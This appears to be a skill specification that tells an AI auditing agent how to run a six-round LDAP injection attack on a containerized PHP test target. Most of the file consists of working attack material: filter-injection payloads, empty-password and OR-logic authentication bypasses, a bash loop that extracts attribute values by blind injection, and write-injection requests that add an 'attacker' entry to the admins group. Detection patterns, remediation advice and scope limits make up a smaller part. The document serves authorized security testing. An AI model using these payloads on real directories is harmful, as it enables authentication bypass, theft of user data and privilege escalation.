## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-059-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 6-round progressive attack against LDAP injection sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 6 attack rounds — if stuck after round 4, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST confirm LDAP injection by observing authentication bypass or data exfiltration — LDAP error messages alone indicate filter | FAIL — LDAP error reported as successful injection |

## 6-Round Attack
**Payload Selection Rule (CR-PAYLOAD)**:

Within each round, test payloads in the following priority order:

| Priority | Condition | Action |
|----------|-----------|--------|
| 1 (try first) | Simplest/most direct payload for this technique | Test baseline vulnerability existence |
| 2 | Encoding/evasion variant of Priority 1 | Test if filters block Priority 1 |
| 3 | Framework-specific or context-adaptive payload | Test framework-aware bypasses |
| 4 (try last) | Complex/chained payload | Test advanced exploitation |

- MUST test Priority 1 before trying Priority 2-4
- If Priority 1 succeeds → record evidence and proceed to next round (do NOT test remaining payloads)
- If Priority 1 fails → try Priority 2, then 3, then 4
- If ALL priorities fail → fill Round Fill-in with `failure_reason` and proceed to next round
- MUST NOT skip Priority 1 to try "creative" payloads directly



#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| payload | `{payload from this round's strategy — must match selected_priority}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R1 - Basic LDAP Filter Injection

Objective: Tamper with query semantics by injecting LDAP filter metacharacters.

Common insecure patterns in PHP applications:
```php
// Dangerous: User input directly concatenated into LDAP filter
$filter = "(uid=" . $_GET['username'] . ")";
$result = ldap_search($conn, $baseDN, $filter);

// Dangerous: sprintf concatenation for filter
$filter = sprintf("(&(uid=%s)(objectClass=person))", $input);
```

Payload:
- `*)(uid=*))(|(uid=*` → filter becomes `(uid=*)(uid=*))(|(uid=*)` → returns all users
- `)(cn=*` → Closes current condition and injects wildcard match
- `*` → Wildcard matches all entries
- `admin)(|(objectClass=*` → Closes uid condition, injects OR condition matching all objectClass
- `*)(mail=*))(|(mail=*` → Leaks all email addresses

Verify with the following requests:
```bash
# Normal request
docker exec php curl -s "http://nginx:80/api/ldap/search?username=admin"
# Injection request
docker exec php curl -s "http://nginx:80/api/ldap/search?username=*)(uid=*))(|(uid=*"
# Compare: More results returned after injection → confirmed
```

**Success Criteria:** The injected query returns significantly more LDAP entries than the normal query, or returns non-target user data.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - Authentication Bypass

Objective: Bypass authentication logic based on `ldap_bind()`.

Common LDAP authentication patterns in PHP:
```php
// Dangerous: Allows empty password binding
$bind = ldap_bind($conn, $userDN, $_POST['password']);
if ($bind) {
    // Authentication successful — but LDAP server may return true for empty passwords (anonymous bind)
}

// Dangerous: DN contains user input
$userDN = "uid=" . $_POST['username'] . ",ou=users,dc=example,dc=com";
$bind = ldap_bind($conn, $userDN, $_POST['password']);
```

Payload:
- **Empty password binding**: `password=` → Some LDAP servers perform anonymous binding for empty passwords and return success
- **Wildcard DN**: `username=*` → DN becomes `uid=*,ou=users,...` → May match any user
- **DN injection**: `username=admin,ou=users,dc=example,dc=com` → Overrides subsequent DN components
- **NULL byte**: `password=%00` → Truncates the password string; some implementations treat it as empty password
- **Anonymous bind probing**: `ldap_bind($conn)` without DN and password → Anonymous bind

Verify with the following requests:
```bash
# Empty password binding
docker exec php curl -s -X POST "http://nginx:80/api/login" \
  -d "username=admin&password="
# Returns login success → confirmed

# NULL byte truncation
docker exec php curl -s -X POST "http://nginx:80/api/login" \
  -d "username=admin&password=%00anything"
```

**Success Criteria:** Passing LDAP authentication without knowing the correct password.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - Boolean Blind Injection

Objective: Gradually infer LDAP attribute values by constructing boolean conditions and leveraging response differences.

Principle: LDAP filters support the wildcard `*`, allowing character-by-character guessing via prefix/suffix matching:
```
(uid=a*)  → Has results → uid starts with a
(uid=ad*) → Has results → uid starts with ad
(uid=ae*) → No results → uid does not start with ae
```

Payload:
- Character-by-character username enumeration:
  ```
  username=a*  → 200 OK (has results)
  username=b*  → 200 OK (no results)
  username=ad* → 200 OK (has results)
  username=adm* → 200 OK (has results)
  username=admin* → 200 OK (has results)
  username=admin → 200 OK (exact match)
  ```
- Password attribute probing (`userPassword`):
  ```
  *)(userPassword=a*
  *)(userPassword=b*
  ```
- Email address enumeration:
  ```
  *)(mail=*@example.com
  *)(mail=admin@*
  ```

Automated blind injection script:
```bash
known=""
for c in {a..z} {A..Z} {0..9} _ - .; do
  resp=$(docker exec php curl -s "http://nginx:80/api/ldap/search?username=${known}${c}*")
  if echo "$resp" | grep -q '"count":'; then
    known="${known}${c}"
    echo "Found: $known"
  fi
done
echo "Final value: $known"
```

**Success Criteria:** Successfully extracting a partial or complete value of at least one LDAP attribute through boolean condition differences.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - OR/AND Logic Injection

Objective: Inject LDAP logical operators to tamper with query logic and bypass access controls or extract additional data.

LDAP filters use prefix notation:
- AND: `(&(condition1)(condition2))`
- OR: `(|(condition1)(condition2))`
- NOT: `(!(condition))`

When the application constructs an AND query:
```php
// Original query: (&(uid=$username)(userPassword=$password))
$filter = "(&(uid=" . $user . ")(userPassword=" . $pass . "))";
```

Payload:
- **OR injection to bypass authentication**:
  ```
  username=admin)(|(uid=admin
  password=anything)
  → filter: (&(uid=admin)(|(uid=admin)(userPassword=anything)))
  → OR condition makes uid=admin always true, password is bypassed
  ```
- **AND condition injection**:
  ```
  username=*)(uid=*)(&(uid=admin
  → Injects additional AND condition
  ```
- **Wildcard combinations**:
  ```
  (|(uid=admin)(uid=*))  → Matches admin or all users
  (&(uid=admin)(userPassword=*))  → Matches admin with non-empty password
  ```
- **NOT condition injection**:
  ```
  username=admin)(!(userPassword=disabled
  → Excludes the disabled account condition
  ```
- **Nested logic injection**:
  ```
  username=*)(|(objectClass=person)(objectClass=organizationalPerson)
  → Enumerates all person-type entries
  ```

Verify with the following requests:
```bash
# OR injection to bypass authentication
docker exec php curl -s -X POST "http://nginx:80/api/login" \
  -d "username=admin)(|(uid=admin&password=anything)"
# Returns authentication success → confirmed
```

**Success Criteria:** Changed query semantics through logical operator injection, bypassing authentication or access controls.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - Special Character Bypass

Objective: Bypass input filtering by leveraging special character encoding and escape differences.

LDAP special characters: `*`, `(`, `)`, `\`, `NUL` (characters defined in RFC 4515 that require escaping)

Payload:
- **Null byte truncation**:
  ```
  username=admin%00)(uid=*
  → PHP string is truncated at \x00 (depends on LDAP library implementation)
  → Subsequent filter construction is broken
  ```
- **Unicode encoding bypass**:
  ```
  username=\75\69\64=admin  → Hexadecimal LDAP encoding of uid=
  username=%u002a  → Unicode-encoded *
  username=\2a    → LDAP hex-escaped *
  ```
- **DN component injection**:
  ```
  username=admin,ou=admins
  → DN becomes uid=admin,ou=admins,ou=users,dc=example,dc=com
  → Search base DN is tampered to the admin OU

  username=admin+cn=test
  → Multi-valued RDN injection
  ```
- **Backslash escape confusion**:
  ```
  username=adm\\29in   → \29 is the escape for ), but double backslash cancels the escape
  username=admin\5c    → Injects the backslash character itself
  ```
- **Mixed encoding**:
  ```
  username=%2a%29%28uid%3d%2a  → URL-encoded *)(uid=*
  username=admin%00%29%28uid%3d%2a  → NULL byte + URL encoding
  ```
- **Line terminator injection**:
  ```
  username=admin%0a(uid=*)  → Newline may break filter parsing
  username=admin%0d%0a     → CRLF injection
  ```

Verify with the following requests:
```bash
# Null byte truncation
docker exec php curl -s "http://nginx:80/api/ldap/search?username=admin%00)(uid=*"

# LDAP hex escape
docker exec php curl -s "http://nginx:80/api/ldap/search?username=\2a"

# DN component injection
docker exec php curl -s -X POST "http://nginx:80/api/login" \
  -d "username=admin,ou=admins&password=test"
```

**Success Criteria:** Successfully triggering LDAP injection by bypassing input validation/filtering through special character encoding.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Advanced Exploitation

Objective: Achieve information enumeration, attribute traversal, and write operations through LDAP injection.

#### 6.1 Attribute Information Enumeration

Enumerate the LDAP directory structure by injecting wildcards and specific objectClass filters:
```
# Enumerate all objectClass values
(objectClass=*)
(objectClass=person)
(objectClass=organizationalUnit)
(objectClass=groupOfNames)
(objectClass=inetOrgPerson)

# Enumerate privileged accounts
(&(objectClass=person)(memberOf=cn=admins,ou=groups,dc=example,dc=com))

# Enumerate service accounts
(&(objectClass=person)(uid=svc-*))
(&(objectClass=person)(description=*service*))
```

#### 6.2 objectClass Traversal

Systematically traverse the LDAP directory tree:
```
# Active Directory-specific objectClass
(objectClass=computer)
(objectClass=domainDNS)
(objectClass=groupPolicyContainer)
(objectCategory=CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=example,DC=com)

# OpenLDAP-specific
(objectClass=olcGlobal)
(objectClass=olcDatabaseConfig)
```

#### 6.3 LDAP Write Injection

When the application uses `ldap_add()`, `ldap_modify()` with controllable parameters:
```php
// Dangerous: User input controls attribute values
$entry = [
    'cn' => $_POST['name'],
    'sn' => $_POST['surname'],
    'objectClass' => ['inetOrgPerson', 'organizationalPerson', 'person'],
];
ldap_add($conn, "uid=" . $_POST['uid'] . ",ou=users," . $baseDN, $entry);
```

Payload:
- **Attribute injection**: Pass additional attributes via PHP array parameters
  ```
  name=test&surname=test&uid=attacker&memberOf[]=cn=admins,ou=groups,dc=example,dc=com
  → Self-adds to the administrator group
  ```
- **objectClass tampering**:
  ```
  objectClass[]=inetOrgPerson&objectClass[]=simpleSecurityObject
  → Adds objectClass that allows setting userPassword
  ```
- **DN override**:
  ```
  uid=attacker,ou=admins
  → Creates the entry in the admin OU
  ```

#### 6.4 LDAP Search Scope Exploitation

```php
// Search scope is controllable
ldap_search($conn, $baseDN, $filter, [], 0, $limit, $timeout);
// $baseDN controllable → Search root DN to get entire directory tree
```

Payload:
- `baseDN=dc=example,dc=com` → Searches the entire directory tree
- `baseDN=cn=config` → Attempts to read LDAP server configuration (OpenLDAP)
- `baseDN=cn=schema,cn=config` → Reads schema definitions

Verify with the following requests:
```bash
# Attribute enumeration
docker exec php curl -s "http://nginx:80/api/ldap/search?filter=(objectClass=*)"
# Returns entries with multiple objectClass types → confirmed

# Write injection
docker exec php curl -s -X POST "http://nginx:80/api/ldap/user" \
  -d "name=test&surname=test&uid=attacker&memberOf[]=cn=admins,ou=groups,dc=example,dc=com"
# Query confirms attacker is in the admins group → confirmed
```

**Success Criteria:** Enumerating LDAP directory structure and sensitive attributes, or escalating privileges through write injection.

## Evidence Collection

### LDAP Filter Injection Confirmation
```bash
# Wildcard injection: Returns all users
docker exec php curl -s "http://nginx:80/api/ldap/search?username=*"
# Returns multiple user entries → confirmed

# Filter injection: Close parenthesis and append condition
docker exec php curl -s "http://nginx:80/api/ldap/search?username=admin)(uid=*"
# Returns more results than normal query → confirmed
```

### LDAP Authentication Bypass Confirmation
```bash
# Empty password binding
docker exec php curl -s -X POST "http://nginx:80/api/login" \
  -d "username=admin&password="
# Returns login success without correct password → confirmed

# OR logic injection bypass
docker exec php curl -s -X POST "http://nginx:80/api/login" \
  -d "username=admin)(|(uid=admin&password=x)"
# Returns authentication success → confirmed
```

### LDAP Write Injection Confirmation
```bash
# Post-write query verification
docker exec php curl -s "http://nginx:80/api/ldap/search?username=attacker"
# Confirms the written entry exists and contains injected attributes → confirmed
```

Evidence standards:
- Filter injection returns unauthorized data → **confirmed**
- Empty password or logic injection bypasses authentication → **confirmed**
- Boolean blind injection successfully extracts attribute values (≥3 characters) → **confirmed**
- Write injection successfully adds/modifies LDAP entries → **confirmed**
- Only filter syntax errors or connection anomalies with no data leakage → **suspected**

## Evidence Requirements

| Evidence Type | Example |
|---|---|
| Filter injection | `*)(uid=*)` returns entire user list (normal: 1 entry vs injected: 50+ entries) |
| Authentication bypass | Empty password `ldap_bind()` returns `true`, subsequently obtains admin Session |
| Boolean blind injection | Character-by-character extraction of `userPassword` attribute for `uid=admin` |
| Logic injection | `(|(uid=admin)(uid=*))` bypasses password verification, returns authentication success |
| Write injection | `memberOf[]` parameter injection adds attacker to admin group |
| Information enumeration | `(objectClass=*)` returns directory tree structure and sensitive attributes |

## Report Format

```json
{
  "vuln_type": "LDAPi",
  "sub_type": "filter_injection|auth_bypass|boolean_blind|logic_injection|encoding_bypass|write_injection|info_enumeration",
  "round": 1,
  "endpoint": "GET /api/ldap/search?username=",
  "ldap_server": "OpenLDAP|ActiveDirectory|389DS",
  "sink_function": "ldap_search|ldap_bind|ldap_add|ldap_modify",
  "payload": "*)(uid=*))(|(uid=*",
  "evidence": "Normal query returns 1 result; after injection returns 53 user entries including uid/mail/cn attributes",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Authentication bypass|Data leak|Privilege escalation|Directory traversal|Information enumeration",
  "remediation": "Use ldap_escape() to escape user input (PHP >= 5.6), use parameterized LDAP query frameworks (Symfony Ldap Component), disable anonymous binding, reject empty password bind"
}
```

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential LDAP injection vulnerabilities:
- Pattern 1: `ldap_search($conn, $baseDN, "(uid=" . $_GET['user'] . ")")` — User input directly concatenated into LDAP filter; attacker can inject `*)(uid=*)` to return all entries
- Pattern 2: `ldap_bind($conn, $userDN, $_POST['password'])` without empty password validation — Empty password triggers anonymous binding, `ldap_bind()` returns `true`, bypassing authentication
- Pattern 3: `$dn = "uid=" . $_POST['username'] . ",ou=users," . $baseDN` — DN string concatenation; attacker can inject `,ou=admins` to alter the search path
- Pattern 4: `sprintf("(&(uid=%s)(userPassword=%s))", $user, $pass)` — `sprintf` concatenation of LDAP AND query; `)(|(uid=*` can be injected to break the logic
- Pattern 5: `$filter = "(&(objectClass=person)(cn=*" . $search . "*))"`  — Search functionality filter concatenation; wildcard and parenthesis injection
- Pattern 6: `Adldap::search()->rawFilter("(uid=$input)")` / `LdapRecord`'s `rawFilter()` — Framework raw filter methods are equally vulnerable to injection
- Pattern 7: `ldap_add($conn, $dn, $entry)` where `$entry` contains user-controllable fields — Sensitive attributes like `memberOf`, `objectClass` can be injected

## Key Insight

> **Key Point**: The core of LDAP injection lies in the prefix expression syntax of LDAP filters — parentheses and logical operators `|`, `&`, `!` constitute query semantics, and the vast majority of PHP applications construct filters through string concatenation (`"(uid=" . $input . ")"`), allowing attackers to inject arbitrary conditions simply by closing parentheses. During auditing, first locate whether the filter parameter of all `ldap_search()`/`ldap_list()`/`ldap_read()` calls contains user input concatenation, then analyze whether `ldap_bind()` validates empty passwords (PHP's `ldap_bind()` performs anonymous binding and returns `true` for empty passwords by default), then trace whether DN construction includes user input, and finally search the code to confirm whether `ldap_escape()` (PHP ≥ 5.6) or framework-provided parameterized queries are used. Unlike SQL injection, LDAP injection cannot directly execute arbitrary commands, but it can achieve authentication bypass, directory enumeration, and attribute tampering — the impact MUST NOT be underestimated.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked `ldap_escape()` calls and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other experts (e.g., internal LDAP server addresses discovered by SSRF)
3. Decision tree matching: Select new attack directions based on failure patterns in `shared/pivot_strategy.md`
4. Terminate early when no new paths exist to avoid wasting rounds producing hallucinated results

## Prerequisites and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the `auth_level` for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-LDAP-001"
}
```
- All reason fields MUST be filled with specific justification; MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract References (EVID)

Every vulnerability conclusion MUST reference the following evidence points in the `evidence` field (see `shared/evidence_contract.md`):
- `EVID_LDAP_QUERY_POINT` — ldap_search/ldap_bind call location (file:line) ✅ Required
- `EVID_LDAP_FILTER_CONSTRUCTION` — LDAP filter string construction/concatenation evidence ✅ Required
- `EVID_LDAP_USER_INPUT_PATH` — Data flow from user input to LDAP filter/DN ✅ Required
- `EVID_LDAP_INJECTION_RESPONSE` — Response difference evidence of successful injection Required for confirmation

Missing required EVID → Conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` write protocol for format):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit.json`).

## Collaboration

- Pass LDAP-leaked credentials/user lists to the Privilege Escalation Auditor
- Pass discovered internal LDAP server addresses to the SSRF Auditor
- Pass LDAP write injection capability (`ldap_add`/`ldap_modify`) to the Privilege Escalation Auditor
- Submit all findings to the QA Reviewer for evidence verification

## Real-Time Sharing and Second-Order Tracking

### Shared Writes
Data obtained through LDAP injection **MUST** be written to the shared findings store (`$WORK_DIR/audit_session.db`):
- Extracted credentials/user lists → `finding_type: credential`
- Enumerated LDAP directory structure → `finding_type: directory_structure`
- Discovered service account information → `finding_type: service_account`

### Shared Reads
Read the shared findings store before starting the attack phase, leveraging:
- Internal LDAP server addresses discovered by SSRF (`ldap://internal:389`)
- LDAP configuration information leaked by other injection points (bind DN, base DN, password)
- `config/ldap.php` and other configuration file contents obtained via file read vulnerabilities

## Constraints

- LDAP write tests (`ldap_add`/`ldap_modify`/`ldap_delete`) MUST clean up test entries afterward
- Boolean blind injection enumeration limit: maximum 200 characters per attribute extraction
- MUST NOT perform bulk deletion operations on production LDAP directories
- DN injection tests MUST NOT modify group membership of existing entries
- `ldap_bind()` tests MUST NOT cause account lockout (keep failure count within threshold)
- Enumeration operations SHOULD control request frequency to avoid triggering LDAP server rate limits


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

## Examples

### ✅ GOOD Output Example

```json
{
  "sink_id": "LDAP-001",
  "vuln_type": "LDAPi",
  "sub_type": "filter_injection",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "confirmed_round": 1,
  "endpoint": "GET /api/ldap/search?username=",
  "ldap_server": "OpenLDAP",
  "sink_function": "ldap_search",
  "payload": "*)(uid=*))(|(uid=*",
  "evidence": "EVID_LDAP_QUERY_POINT: LdapController.php:28 — ldap_search($conn, $baseDN, $filter); EVID_LDAP_FILTER_CONSTRUCTION: $filter='(uid='.$_GET['username'].')' — direct concatenation; EVID_LDAP_USER_INPUT_PATH: $_GET['username'] → sprintf → ldap_search() filter param; EVID_LDAP_INJECTION_RESPONSE: Normal query returns 1 entry, injected query returns 53 entries with uid/mail/cn attributes",
  "confidence": "confirmed",
  "impact": "Full LDAP directory enumeration — all user entries leaked",
  "prerequisite_conditions": { "auth_requirement": "authenticated", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 2, "impact": 2, "complexity": 3, "score": 2.25, "cvss": 7.5, "level": "H" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "LDAP-001",
  "vuln_type": "LDAPi",
  "final_verdict": "confirmed",
  "evidence": "ldap_search uses user input",
  "severity": { "level": "H" }
}
// ❌ Using user input is pattern, not proof
// ❌ No injection payload, no response comparison
// ❌ Missing EVID references
// ❌ severity missing scores and reasons
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-checks per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only after all are ✅
2. Execute the specialized self-checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → Correct and re-check; MUST NOT skip

### Specialized Self-Checks (LDAP Auditor Specific)
- [ ] S1: User input concatenation points in LDAP query construction have been annotated
- [ ] S2: Evidence of unescaped special characters (*, ), (, \) has been presented
- [ ] S3: Absence of ldap_escape or parameterized queries has been confirmed

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| LDAP server unreachable from container | Verify LDAP port connectivity, retry with alternative bind; if failed → record `"status": "ldap_unreachable"` |
| Parameterized LDAP query blocks injection | Attempt filter manipulation via wildcard and meta-character variants; if blocked → record `"status": "ldap_parameterized"` |
| No valid injection point found | Record `"status": "no_injection_point"`, set `final_verdict: "not_vulnerable"` |
| Authentication token expired mid-attack | Re-fetch credentials from auth_credentials.json, retry current round |
